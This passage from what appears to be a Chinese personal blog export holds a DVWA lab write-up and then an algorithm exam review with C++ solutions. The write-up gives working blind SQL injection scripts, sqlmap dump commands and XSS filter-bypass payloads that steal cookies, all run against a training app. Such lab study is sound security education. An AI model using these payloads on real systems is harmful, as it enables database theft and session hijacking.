/&gt;Surname: &#123;$last&#125;&lt;/pre&gt;\"; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS[\"___mysqli_ston\"]))) ? false : $___mysqli_res); &#125; ?&gt; $query = \"SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;\"; 存在注入的语句只是在low级别的基础上加上了Limit限制了回显的行数，但是使用low级别的注入语句时会直接把Limit 1注释掉，所以完全与low级别一样。 SQL Injection (Blind)盲注的过程，就像你与一个机器人聊天，这个机器人知道的很多，但只会回答“是”或者“不是”，因此你需要询问它这样的问题，例如“数据库名字的第一个字母是不是a啊？”，通过这种机械的询问，最终获得你想要的数据。 low手工加脚本查询成功返回的语句：User ID exists in the database. 查询失败返回的语句：User ID is MISSING from the database. 这样就可以利用提示信息确定，我们所查询的语句是否正确 首先确定盲注的语句 通过下面的测试，说明ascii函数是可以使用的，写注入的脚本，二分法更快点。 1' and ascii(substring(database(),1,1))&gt;50 # 提示 ：User ID exists in the database. 1' and ascii(substring(database(),1,1))&lt;50 # 提示： User ID is MISSING from the database. # -*- coding = utf - 8 -*- #@Time : 2020/10/26 17:29 #@Author : sunzy #@File : dvwa.py # 二分法盲注 import requests url = \"http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/?id=\" header = &#123;\"Cookie\": \"security=low; PHPSESSID=0477644f8a563ab1fd2f2ecba45bd2d1\"&#125; flag = \"\" for i in range(1,50): left = 32 right = 128 mid = (right + left) &gt;&gt; 1 while(left &lt; right): #获取数据库名 #payload = \"1' and ascii(substring(database(),&#123;0&#125;,1))&gt;&#123;1&#125;%23\".format(i,mid) #获取表名 #payload = \"1' and (select ascii(substring(group_concat(table_name),&#123;0&#125;,1)) as a from information_schema.tables where table_schema=database() having a&gt;&#123;1&#125;)%23\".format(i,mid) #获取列名 #payload = \"1' and (select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from information_schema.columns where table_schema=database() and table_name='flag' having a&gt;&#123;1&#125;)%23\".format(i,mid) #获取flag payload = \"1' and (select ascii(substring(group_concat(fl4g),&#123;0&#125;,1)) as a from flag having a&gt;&#123;1&#125;)%23\".format(i,mid) url1 =url+payload+\"&amp;Submit=Submit#\" response = requests.post(url1,headers= header) if \"exists\" in response.text: left = mid+1 else: right = mid mid=(right+left)&gt;&gt;1 flag = flag + chr(mid) print(flag) 1.首先获取表名 使用payload: payload = \"1' and (select ascii(substring(group_concat(table_name),&#123;0&#125;,1)) as a from information_schema.tables where table_schema=database() having a&gt;&#123;1&#125;)%23\".format(i,mid) 2.获取列名 使用payload payload = \"1' and (select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from information_schema.columns where table_schema=database() and table_name='flag' having a&gt;&#123;1&#125;)%23\".format(i,mid) 3.获取flag 使用payload payload = \"1' and (select ascii(substring(group_concat(fl4g),&#123;0&#125;,1)) as a from flag having a&gt;&#123;1&#125;)%23\".format(i,mid) sqlmappython2 sqlmap.py -u \"http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#\" -p \"id\" --cookie \"security=low; PHPSESSID=e31dkassqtg9388l159fn72ac1\" --dbs --batch python2 sqlmap.py -u \"http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#\" -p \"id\" --cookie \"security=low; PHPSESSID=e31dkassqtg9388l159fn72ac1\" -D dvwa --tables --batch python2 sqlmap.py -u \"http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#\" -p \"id\" --cookie \"security=low; PHPSESSID=e31dkassqtg9388l159fn72ac1\" -D dvwa -T flag --columns --batch python2 sqlmap.py -u \"http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#\" -p \"id\" --cookie \"security=low; PHPSESSID=e31dkassqtg9388l159fn72ac1\" -D dvwa -T flag -C fl4g --dump --batch medium手工加脚本与low级别不同，中级别提交数据是post类型，所以需要抓包后再提交。 id=1 and length(database())=4 #&amp;Submit=Submit 提示User ID exists in the database. id=1 and length(database())=5 #&amp;Submit=Submit User ID is MISSING from the database 所以思路还是与low级别一样，只不过脚本中提交数据的方式改为POST类型 直接上脚本 import requests url = \"http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/\" header = &#123;\"Cookie\": \"security=medium; PHPSESSID=e31dkassqtg9388l159fn72ac1\"&#125; flag = \"\" t = \"\" sum=0 for i in range(1,50): left = 32 right = 128 mid = (right + left) &gt;&gt; 1 while(left &lt; right): #payload = \"1 and ascii(substring(database(),&#123;0&#125;,1))&gt;&#123;1&#125;%23\".format(i,mid) #payload = \"1 and (select ascii(substring(group_concat(table_name),&#123;0&#125;,1)) as a from information_schema.tables where table_schema=database() having a&gt;&#123;1&#125;)%23\".format(i,mid) #payload = \"1 and (select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from information_schema.columns where table_schema=database() and table_name='flag' having a&gt;&#123;1&#125;)%23\".format(i,mid) payload = \"1 and (select ascii(substring(group_concat(fl4g),&#123;0&#125;,1)) as a from flag having a&gt;&#123;1&#125;)%23\".format(i,mid) data = &#123;'id': payload, 'Submit': 'Submit'&#125; response = requests.post(url,headers = header,data=data) t = response.text if \"exists\" in response.text: left = mid+1 else: right = mid mid=(right+left)&gt;&gt;1 print(mid) flag = flag + chr(mid) print(flag) sqlmappython2 sqlmap.py -u \"http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/\" --data \"id=1&amp;Submit=Submit\" -p \"id\" --cookie \"security=medium; PHPSESSID=e31dkassqtg9388l159fn72ac1\" --dbs python2 sqlmap.py -u \"http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/\" --data \"id=1&amp;Submit=Submit\" -p \"id\" --cookie \"security=medium; PHPSESSID=e31dkassqtg9388l159fn72ac1\" -D dvwa --tables python2 sqlmap.py -u \"http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/\" --data \"id=1&amp;Submit=Submit\" -p \"id\" --cookie \"security=medium; PHPSESSID=e31dkassqtg9388l159fn72ac1\" -D dvwa -T flag --columns python2 sqlmap.py -u \"http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/\" --data \"id=1&amp;Submit=Submit\" -p \"id\" --cookie \"security=medium; PHPSESSID=e31dkassqtg9388l159fn72ac1\" -D dvwa -T flag -C fl4g --dump sqlmap中给了三种注入方式，并且给出了payload，可以基于给出的提示继续做下去 下面是sqlmap爆出的flag。 源码分析 &lt;?php if( isset( $_POST[ 'Submit' ] ) ) &#123; // Get input $id = $_POST[ 'id' ]; $id = mysql_real_escape_string( $id ); // Check database $getid = \"SELECT first_name, last_name FROM users WHERE user_id = $id;\"; $result = mysql_query( $getid ); // Removed 'or die' to suppress mysql errors // Get results $num = @mysql_numrows( $result ); // The '@' character suppresses errors if( $num &gt; 0 ) &#123; // Feedback for end user echo '&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;'; &#125; else &#123; // Feedback for end user echo '&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;'; &#125; //mysql_close(); &#125; ?&gt; mysql_real_escape_string() 调用mysql库的函数 mysql_real_escape_string, 在以下字符前添加反斜杠: \\x00, \\n, \\r, \\, &#39;, &quot; 和 \\x1a. 本质上跟low级别的没有太大的区别，只是将一些特殊字符转义，但是我们注入时没有用到这些字符，所以注入语句基本和low级别一样 highGET /dvwa/vulnerabilities/sqli_blind/ HTTP/1.1 Host: 10.5.8.66 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Referer: http://10.5.8.66/dvwa/vulnerabilities/sqli/ Connection: close Cookie: id=1; security=high; PHPSESSID=e31dkassqtg9388l159fn72ac1 Upgrade-Insecure-Requests: 1 Cache-Control: max-age=0 抓包后可以发现提交的参数id在cookie中，所以与中级别的方法不一样了，但是还是可以使用sqlmap注入。 手工加脚本通过手工测试发现是字符型注入，与low级别的脚本大同小异，只是将注入的位置改到了cookie的位置 import requests url = \"http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/\" t=\"\" flag = \"\" for i in range(1,50): left = 32 right = 128 mid = (right + left) &gt;&gt; 1 while(left &lt; right): #payload = \"1' and ascii(substring(database(),&#123;0&#125;,1))&gt;&#123;1&#125;%23\".format(i,mid) payload = \"1' and (select ascii(substring(group_concat(table_name),&#123;0&#125;,1)) as a from information_schema.tables where table_schema=database() having a&gt;&#123;1&#125;)%23\".format(i,mid) #payload = \"1' and (select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from information_schema.columns where table_schema=database() and table_name='flag' having a&gt;&#123;1&#125;)%23\".format(i,mid) #payload = \"1' and (select ascii(substring(group_concat(fl4g),&#123;0&#125;,1)) as a from flag having a&gt;&#123;1&#125;)%23\".format(i,mid) id = payload header = &#123;\"Cookie\": \"id=\"+payload+\";\"+\"security=high; PHPSESSID=e31dkassqtg9388l159fn72ac1\"&#125; #print(header) response = requests.post(url,headers = header) t = response.text if \"exists\" in response.text: left = mid+1 else: right = mid mid=(right+left)&gt;&gt;1 print(mid) #print(t) flag = flag + chr(mid) print(flag) sqlmappython2 sqlmap.py -u \"http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/\" -p \"id\" --cookie \"id=1; security=high; PHPSESSID=e31dkassqtg9388l159fn72ac1\" --level 2 --dbs --batch python2 sqlmap.py -u \"http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/\" -p \"id\" --cookie \"id=1; security=high; PHPSESSID=e31dkassqtg9388l159fn72ac1\" --level 2 -D dvwa --tables --batch python2 sqlmap.py -u \"http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/\" -p \"id\" --cookie \"id=1; security=high; PHPSESSID=e31dkassqtg9388l159fn72ac1\" --level 2 -D dvwa -T flag --columns --batch python2 sqlmap.py -u \"http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/\" -p \"id\" --cookie \"id=1; security=high; PHPSESSID=e31dkassqtg9388l159fn72ac1\" --level 2 -D dvwa -T flag -C fl4g --dump --batch sql注入防御通过查看impossible源码发现检测了id数据类型，使用了预编译绑定id变量，有效防止SQL注入，这些可以在以后编程中应用，以编写出更加安全的代码。 &lt;?php if( isset( $_GET[ 'Submit' ] ) ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); // Get input $id = $_GET[ 'id' ]; // Was a number entered? if(is_numeric( $id )) &#123; //检测提交的数据是否为数字类型 // Check the database $data = $db-&gt;prepare( 'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;' );//预编译绑定了id变量 $data-&gt;bindParam( ':id', $id, PDO::PARAM_INT ); $data-&gt;execute(); // Get results if( $data-&gt;rowCount() == 1 ) &#123; // Feedback for end user echo '&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;'; &#125; else &#123; // User wasn't found, so the page wasn't! header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' ); // Feedback for end user echo '&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;'; &#125; &#125; &#125; // Generate Anti-CSRF token generateSessionToken(); ?&gt; XSS (Reflected)low&lt;?php header (\"X-XSS-Protection: 0\"); // Is there any input? if( array_key_exists( \"name\", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) &#123; // Feedback for end user echo '&lt;pre&gt;Hello ' . $_GET[ 'name' ] . '&lt;/pre&gt;'; &#125; ?&gt; 可以看到，代码直接引用了name参数，并没有任何的过滤与检查，存在明显的XSS漏洞 。 先测试一下 &lt;script&gt;alert(\"xss\");&lt;/script&gt; 获取cookie &lt;script&gt;alert(document.cookie);&lt;/script&gt; medium&lt;?php header (\"X-XSS-Protection: 0\"); // Is there any input? if( array_key_exists( \"name\", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) &#123; // Get input $name = str_replace( '&lt;script&gt;', '', $_GET[ 'name' ] ); // Feedback for end user echo \"&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;\"; &#125; ?&gt; 代码审计后可以发现是对输入的内容进行了过滤，将&lt;script&gt;替换为空，可以双写绕过，也可以大小写绕过。 构造payload： &lt;sCriPt&gt;alert(document.cookie)&lt;/script&gt; &lt;scr&lt;script&gt;ipt&gt;alert(document.cookie)&lt;/script&gt; //使用其他标签 &lt;IMG src=1 onerror=alert(document.cookie)&gt; high&lt;?php header (\"X-XSS-Protection: 0\"); // Is there any input? if( array_key_exists( \"name\", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) &#123; // Get input $name = preg_replace( '/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] ); // Feedback for end user echo \"&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;\"; &#125; ?&gt; 先代码审计，执行一个正则表达式的搜索和替换,其中 /&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i 是正则表达式 (.*) 表示贪婪匹配，/i 表示不区分大小写所以在High级别的代码中，所有关于 &lt;script&gt; 标签均被过滤删除了 ,可以使用其他的标签。 构造payload： &lt;IMG src=1 onerror=alert(document.cookie)&gt; XSS (Stored)low&lt;?php if( isset( $_POST[ 'btnSign' ] ) ) &#123; // Get input $message = trim( $_POST[ 'mtxMessage' ] ); $name = trim( $_POST[ 'txtName' ] ); // Sanitize message input $message = stripslashes( $message ); $message = ((isset($GLOBALS[\"___mysqli_ston\"]) &amp;&amp; is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"], $message ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\")); // Sanitize name input $name = ((isset($GLOBALS[\"___mysqli_ston\"]) &amp;&amp; is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"], $name ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\")); // Update database $query = \"INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );\"; $result = mysqli_query($GLOBALS[\"___mysqli_ston\"], $query ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_error($GLOBALS[\"___mysqli_ston\"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' ); //mysql_close(); &#125; ?&gt; 分析 isset() 函数在php中用来检测变量是否设置，该函数返回的是布尔类型的值，即true/false trim() 函数作用为移除字符串两侧空白字符或其他预定义字符 stripslashes() 函数用于删除字符串中的反斜杠 mysqli_real_escape_string() 函数会对字符串中的特殊号(\\x00，\\n，\\r，\\，&#39;，&quot;，\\x1a) 进行转义 在代码中对message，name输入框内容 没有进行XSS方面的过滤和检查 且通过 query 语句插入到数据库中。所以存在存储型XSS漏洞 这里name ,message的输入框中都存在xss，所以两个位置都可以使用，但是name位置有字数限制，可以使用bp抓包修改 由于是存储型XSS,所以每次刷新页面都会弹出cookie。 medium&lt;?php if( isset( $_POST[ 'btnSign' ] ) ) &#123; // Get input $message = trim( $_POST[ 'mtxMessage' ] ); $name = trim( $_POST[ 'txtName' ] ); // Sanitize message input $message = strip_tags( addslashes( $message ) ); $message = ((isset($GLOBALS[\"___mysqli_ston\"]) &amp;&amp; is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"], $message ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\")); $message = htmlspecialchars( $message ); // Sanitize name input $name = str_replace( '&lt;script&gt;', '', $name ); $name = ((isset($GLOBALS[\"___mysqli_ston\"]) &amp;&amp; is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"], $name ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\")); // Update database $query = \"INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );\"; $result = mysqli_query($GLOBALS[\"___mysqli_ston\"], $query ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_error($GLOBALS[\"___mysqli_ston\"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' ); //mysql_close(); &#125; ?&gt; 分析$message = strip_tags( addslashes( $message ) ); $message = htmlspecialchars( $message ); $name = str_replace( '&lt;script&gt;', '', $name ); strip_tags() 函数剥去字符串中的 HTML、XML 以及 PHP 的标签，但允许使用 &lt;b&gt; 标签。 addslashes() 函数返回在预定义字符（单引号、双引号、反斜杠、NULL）之前添加反斜杠的字符串。 htmlspecialchars() 函数把预定义的字符&amp;、”、’、&lt;、&gt;转换为 HTML 实体，防止浏览器将其作为HTML元素 对message输入内容进行检测过滤，因此无法再通过message参数注入XSS代码 但是对于name参数，只是简单过滤了&lt;script&gt;字符串，仍然存在存储型的XSS，与反射型中级的一样的方法 payload 使用双写绕过，输入 &lt;scr&lt;script&gt;ipt&gt;alert(document.cookie)&lt;/script&gt; 使用大小写绕过，输入&lt;sCript&gt;alert(document.cookie)&lt;/script&gt; 输入其他标签，如 &lt;IMG src=1 onerror=alert(document.cookie)&gt; high&lt;?php if( isset( $_POST[ 'btnSign' ] ) ) &#123; // Get input $message = trim( $_POST[ 'mtxMessage' ] ); $name = trim( $_POST[ 'txtName' ] ); // Sanitize message input $message = strip_tags( addslashes( $message ) ); $message = ((isset($GLOBALS[\"___mysqli_ston\"]) &amp;&amp; is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"], $message ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\")); $message = htmlspecialchars( $message ); // Sanitize name input $name = preg_replace( '/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $name ); $name = ((isset($GLOBALS[\"___mysqli_ston\"]) &amp;&amp; is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"], $name ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\")); // Update database $query = \"INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );\"; $result = mysqli_query($GLOBALS[\"___mysqli_ston\"], $query ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_error($GLOBALS[\"___mysqli_ston\"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' ); //mysql_close(); &#125; ?&gt; 分析$message = strip_tags( addslashes( $message ) ); $message = htmlspecialchars( $message ); $name = preg_replace( '/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $name ); strip_tags() 函数剥去字符串中的 HTML、XML 以及 PHP 的标签，但允许使用 &lt;b&gt; 标签。 addslashes() 函数返回在预定义字符（单引号、双引号、反斜杠、NULL）之前添加反斜杠的字符串。 htmlspecialchars() 函数把预定义的字符&amp;、”、’、&lt;、&gt;转换为 HTML 实体，防止浏览器将其作为HTML元素 name,执行一个正则表达式的搜索和替换,其中 /&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i 是正则表达式 (.*) 表示贪婪匹配，/i 表示不区分大小写所以在High级别的代码中，所有关于 &lt;script&gt; 标签均被过滤删除了 ,可以使用其他的标签。 只能换一个标签 &lt;IMG src=1 onerror=alert(document.cookie)&gt;","tags":[{"name":"sql","slug":"sql","permalink":"https://sunzhengyu99.github.io/tags/sql/"},{"name":"xss","slug":"xss","permalink":"https://sunzhengyu99.github.io/tags/xss/"},{"name":"blind sql","slug":"blind-sql","permalink":"https://sunzhengyu99.github.io/tags/blind-sql/"}]},{"title":"算法上机复习","date":"2020-11-04T13:21:42.000Z","path":"2020/11/04/算法上机复习/","text":"最近算法实验要上机考试，所以还是准备一下吧(还不是因为自己太菜了) 16级题目问题 A: 星空梦想——鲁班题目描述鲁班七号是王者峡谷里的射手，站撸英雄。战场上的鲁班七号，机制强大的鲨嘴炮，立刻将挡在前路的任何物体轰飞。正如他所说的，“借你们的肉体试验下新发明的威力”。是的，这就是鲁班大师和他的天才机关造物鲁班七号。然而，鲁班最为致命的缺点是腿短，跑得慢，一个稍不留神，便会被刺客所击杀。 既然腿短，那么就来多多运动吧，跳跳台阶可还行？假设鲁班七号一次可以跳上1级台阶，但极限一次只能跳上2级台阶（腿短没办法，嘤嘤嘤）。鲁班七号现在从0级阶梯开始，最终跳上第n级的台阶，求总共有多少种跳法？ 输入多组测试用例。 第一行输入包含一个整数T（1&lt;=T&lt;=50），代表测试用例个数。 接下来T行，每行输入包含一个整数n（1&lt;=n&lt;=50），代表鲁班最终跳上了第n级台阶。 输出每组测试用例对应一行输出，每行输出一个整数ans，代表鲁班最终跳上第n级台阶的跳法种数。 样例输入3 3 4 50 样例输出3 5 20365011074 提示注意结果超过int范围，请用long long类型存储ans #include&lt;bits/stdc++.h&gt; using namespace std; const int N=50; long long f[N]; int main() &#123; f[0]=1,f[1]=1; for(int i=2;i&lt;=50;i++) &#123; f[i]=f[i-1]+f[i-2]; &#125; int n; cin&gt;&gt;n; while(n--) &#123; int m; cin&gt;&gt;m; cout&lt;&lt;f[m]&lt;&lt;endl; &#125; return 0; &#125; 问题 B: 午夜歌剧——元歌题目描述元歌是王者峡谷里的刺客。何谓至高机关之美呢？唯有以至高权力的手令太古奇迹重现人世，方能称得上啊。 是的，元歌擅长操控，所做傀儡能起到以假乱真的作用，今天元歌的傀儡变成你的初中数学老师，给你出个数学题：给你一个数字x，让你求出k7、k6、k5、k4、k3、k2、k1、k0（0&lt;=ki&lt;=9），使得以下等式1成立，最后根据等式2求出最终ans值。 等式1： 等式2： 输入多组测试用例。 第一行输入包含一个整数T（1&lt;=T&lt;=1000），代表测试用例个数。 接下来T行，每一行包含一个整数x（1&lt;=x&lt;=1500000）。 输出每组测试用例对应一行输出，每行输出一个整数ans，代表最终运算结果。 样例输入3 7 143 3223193224 样例输出10 151 163311433223 提示测试数据均大于等于1，不用特判0 感觉图片等式有点问题，一开始没理解什么意思，后来看了学长的提示。本质就是进制转换。 #include&lt;bits/stdc++.h&gt; using namespace std; int t,m; void convert(int n) &#123; int c,r; r=n%7; c=n/7; if(c&gt;0) &#123; convert(c); cout&lt;&lt;r; &#125; else cout&lt;&lt;n; &#125; int main() &#123; cin&gt;&gt;t; while(t--) &#123; cin&gt;&gt;m; convert(m); cout&lt;&lt;endl; &#125; return 0; &#125; 问题 C: 圣诞恋歌——貂蝉题目描述貂蝉是王者峡谷里的法师/刺客，貂蝉打法一定要注意配合技能与被动。半肉出装加上蛇皮走位，往往可以1打5，轻松拿下5杀。语花印被动描述为：技能命中会为敌人叠加花之印记，叠加满4层后印记触发被动，会给自身回复生命，同时会对周围敌人造成真实伤害并减速。我们现在对貂蝉的技能及被动进行简化如下：每使用1次技能会攻击1次目标，每攻击3次目标，会自动额外攻击1次目标。现在，貂蝉在游戏中使用了n次技能，请问总共会给目标带来多少次攻击。 输入多组测试数据，第一行输入包含一个整数T，代表测试样例个数。接下来T行，每行输入包含一个整数n（1&lt;=n&lt;=100），代表貂蝉使用了n次技能。 输出每组测试用例对应一行输出，每行输出一个整数ans，代表貂蝉对目标进行了ans次攻击。 样例输入6 1 2 3 45 81 样例输出1 2 4 57 121 提示这题就是汽水瓶的改编。。。 #include&lt;bits/stdc++.h&gt; using namespace std; int main() &#123; int n; cin&gt;&gt;n; while(n--) &#123; int m,sum; cin&gt;&gt;m; sum=0; while(m&gt;3) &#123; m=m-2; sum=sum+3; &#125; if(m==3) sum+=4; else sum=m; cout&lt;&lt;sum&lt;&lt;endl; &#125; return 0; &#125; 问题 D: 海之征途——孙策题目描述孙策是王者峡谷里的坦克/战士。大船靠岸，江郡欢呼着迎来了他们的新领袖，人称江东小霸王的年轻人。游戏中，孙策的技能长帆破浪，可以驾船冲锋，可将船撞向敌方单位或者阻挡物，并造成一定的伤害。 现在，有一群好奇的江郡小朋友想跟着孙策一起出海航行，但孙策的船承载不了所有小朋友，所以孙策决定，尽可能带更多的小朋友出海，现在请你帮孙策谋一个策略，使得更多的小朋友有机会出海航行。已知的条件是孙策船的最大载重m，以及n个小朋友的体重。 输入多组测试用例。第一行输入包含一个整数T（1&lt;=T&lt;=1000），代表测试用例个数。 每组测试用例第一行有两个整数m和n。（0&lt;=m&lt;=1000， 0&lt;=n&lt;=1000），分别代表船的载重重量和小朋友的个数，接下来一行为n个小朋友的体重。 输出每组测试用例对应一行输出，每行输出一个整数ans，代表最多能有ans个小朋友跟着一起出海。 样例输入2 10 4 3 5 2 4 20 9 3 5 2 4 6 1 8 5 9 样例输出3 6 提示就是简单的装在问题 #include&lt;bits/stdc++.h&gt; using namespace std; int T,m,n; int w[1005]; int main() &#123; cin&gt;&gt;T; while(T--) &#123; int ans=0; cin&gt;&gt;m&gt;&gt;n; for(int i=0;i&lt;n;i++) &#123; cin&gt;&gt;w[i]; &#125; sort(w,w+n); for(int i=0;i&lt;n;i++) &#123; if(m&gt;=w[i]) &#123; ans++; m-=w[i]; &#125; else break; &#125; cout&lt;&lt;ans&lt;&lt;endl; &#125; return 0; &#125; 问题 E: 极冰防御——盾山题目描述盾山是王者峡谷里的辅助，一夫当关、万夫莫开，一个好的辅助往往可以给团队带来极大帮助。 盾山的游戏中的一个技能为不动如山：手握一块由石头组成的巨盾，张开巨盾砸向地面，将敌人推开，并持续一段时间。 假设盾山最多只能承受C重量的盾牌，而现在有N个小石头，每个石头i的重量为Wi，防御值为Pi。那么，呆萌的盾山想知道，他从N个小石头中挑选M个（M&lt;=N）组成他可承受盾牌，最大的防御值是多少？ 输入多组测试用例。第一行输入包含一个整数T（1&lt;=T&lt;=10），代表测试用例个数。 接下来有T组测试用例。每组测试用例第一行为盾山承受盾牌的最大重量C(C&lt;10000)和小石头的个数N(N&lt;1000)。接下来的N行分别为小石头的重量Wi(1&lt;=Wi&lt;=100)和防御值Pi(1&lt;=Pi&lt;=3000000)。 输出每组测试用例对应一行输出，每行输出一个整数ans，代表可承受盾牌的最大防御值。 样例输入1 10 5 2 6 2 3 6 5 5 4 4 6 样例输出15 提示01背包问题，不知道下面的解能不能过 #include&lt;bits/stdc++.h&gt; using namespace std; const int N=1e5+5; long long ans[N]; int w[N],v[N]; int T; int main() &#123; cin&gt;&gt;T; while(T--) &#123; int C,N; memset(ans,0,sizeof(ans)); cin&gt;&gt;C&gt;&gt;N; for(int i=0;i&lt;N;i++) &#123; cin&gt;&gt;w[i]&gt;&gt;v[i]; &#125; for(int i=0;i&lt;N;i++) &#123; for(int j=C;j&gt;=w[i];j--) ans[j]=max(ans[j-1],ans[j-w[i]]+v[i]); &#125; // for(int i=0;i&lt;=C;i++) // cout&lt;&lt;ans[i]&lt;&lt;endl; cout&lt;&lt;ans[C]&lt;&lt;endl; &#125; return 0; &#125; ps:以上代码没有提交测试环境，只是过了给出的测试样例。 dfs大合集迷宫问题题目描述小明置身于一个迷宫，请你帮小明找出从起点到终点的最短路程。小明只能向上下左右四个方向移动。 输入 输入包含多组测试数据。输入的第一行是一个整数T，表示有T组测试数据。每组输入的第一行是两个整数N和M（1&lt;=N,M&lt;=100）。接下来N行，每行输入M个字符，每个字符表示迷宫中的一个小方格。字符的含义如下：‘S’：起点‘E’：终点‘-’：空地，可以通过‘#’：障碍，无法通过输入数据保证有且仅有一个起点和终点。 输出 对于每组输入，输出从起点到终点的最短路程，如果不存在从起点到终点的路，则输出-1。 样例输入1 5 5 s-### ----- ##--- E#--- ---## 样例输出9 #include&lt;iostream&gt; #include&lt;cstring&gt; #include&lt;string&gt; #include&lt;queue&gt; #include &lt;algorithm&gt; using namespace std; int de[100][100];//计步数组 记录走到这个位置所需的步数 不能走到的位置标记为-1 char map[100][100]; //用于存放迷宫地图 typedef pair&lt;int,int&gt; P; //坐标 int to[2][4]=&#123;1,-1,0,0,0,0,1,-1&#125;; //在当前坐标下能走的四个方向 int sx,ex,sy,ey; //(sx,sy)为起点坐标 （ex,ey）为终点坐标 int x,y,nx,ny; //(x,y)为函数中当前位置坐标 （nx,ny)为接下来能到达的坐标 int r,l; //r为行数 l为列数 int bfs() &#123; memset(de,-1,sizeof(de)); queue&lt;P&gt; qu; qu.push(P(sx,sy)); //将起点坐标放入队头 de[sx][sy]=0; while(!qu.empty()) &#123; P p=qu.front(); //取出队头坐标 qu.pop() ;//删除对头及走过的坐标 x=p.first,y=p.second; if(x==ex&amp;&amp;y==ey) break; //到达终点 跳出循环 for(int i=0;i&lt;4;i++) &#123; nx=x+to[0][i];//开始向四个方向移动 ny=y+to[1][i]; if(nx&gt;=0&amp;&amp;nx&lt;r&amp;&amp;ny&gt;=0&amp;&amp;ny&lt;l&amp;&amp;map[nx][ny]!='#'&amp;&amp;de[nx][ny]==-1) //判断是否越界 以及是否能走 排除走过的路 &#123; qu.push(P(nx,ny)); //将能走的坐标放入队列 之后依次删除 de[nx][ny]=de[x][y]+1; //步数加一 &#125; &#125; &#125; if(de[ex][ey]==-1) return -1; //终点的记步数组为-1 及不能到达终点 else return de[ex][ey]; &#125; int main() &#123; int n,i,j; 